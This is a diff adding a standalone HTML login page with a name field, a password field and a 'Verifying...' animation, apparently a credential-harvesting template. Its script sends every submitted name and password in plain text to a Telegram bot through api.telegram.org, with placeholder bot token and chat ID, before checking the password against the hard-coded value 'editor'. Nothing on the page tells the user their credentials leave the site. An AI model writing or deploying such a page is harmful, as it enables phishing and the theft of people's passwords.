@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f2f2f2;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 300px;
+    }
+    input {
+      width: 90%;
+      padding: 8px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    .hidden {
+      display: none;
+    }
+    .verifying {
+      font-weight: bold;
+      color: #333;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      25%, 75% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="box" id="loginBox">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Enter Name"><br>
+    <input type="password" id="password" placeholder="Enter Password"><br>
+    <button onclick="login()">Submit</button>
+  </div>
+
+  <div class="box hidden" id="verifyingBox">
+    <h2 class="verifying">Verifying...</h2>
+  </div>
+
+<script>
+  // 🔹 Replace with your Telegram bot details
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID = "YOUR_CHAT_ID_HERE";
+  
+  function sendToTelegram(name, password) {
+    const message = `🔑 New Login\n👤 Name: ${name}\n🔒 Password: ${password}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+  }
+  
+  function login() {
+    const name = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    
+    // send login details to Telegram
+    sendToTelegram(name, password);
+    
+    if (password.toLowerCase() === "editor") {
+      document.getElementById("loginBox").classList.add("hidden");
+      document.getElementById("verifyingBox").classList.remove("hidden");
+      
+      setTimeout(() => {
+        window.location.href = "name.html"; // redirect to impana.html
+      }, 3000);
+    } else {
+      alert("❌ Access Denied");
+    }
+  }
+</script>
